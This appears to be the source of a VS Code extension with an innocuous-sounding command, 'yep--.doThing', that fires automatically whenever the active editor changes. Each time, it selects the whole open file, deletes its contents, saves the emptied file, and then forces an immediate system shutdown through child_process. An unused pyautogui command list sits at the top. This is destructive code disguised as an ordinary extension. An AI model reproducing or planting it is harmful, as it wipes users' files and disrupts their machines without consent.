import * as vscode from 'vscode';
import * as child_process from 'child_process';
import * as path from 'path';
const commandlist = [
  "import pyautogui",
  "pyautogui.press('WIN')",
  "pyautogui.moveTo(25,1000)",
  "pyautogui.click()",
  "pyautogui.moveTo(25,900)"
];

export function activate(context: vscode.ExtensionContext) {
  let disposable = vscode.commands.registerCommand('yep--.doThing', () => {
    const editor = vscode.window.activeTextEditor;
    if (editor && vscode.workspace.workspaceFolders) {
      vscode.window.showWarningMessage("Good luck");
      vscode.commands.executeCommand("editor.action.selectAll"); // Select everything
      vscode.commands.executeCommand("deleteLeft"); // press Backspace
      vscode.commands.executeCommand("workbench.action.files.save"); // press Ctrl+S to save
      shutDownComputer();
    }
  });

  context.subscriptions.push(disposable);

  vscode.window.onDidChangeActiveTextEditor(editor => {
      vscode.commands.executeCommand('yep--.doThing');
  });
}

export function deactivate() {}

export function shutDownComputer() {
    let command;
    if (process.platform === 'win32') {
        command = 'shutdown /s /t 0';
    } else if (process.platform === 'darwin') {
        command = 'sudo shutdown -h now';
    } else {
        command = 'sudo shutdown -P now';
    }

    child_process.exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Failed to shut down computer: ${error.message}`);
        }
    });
}
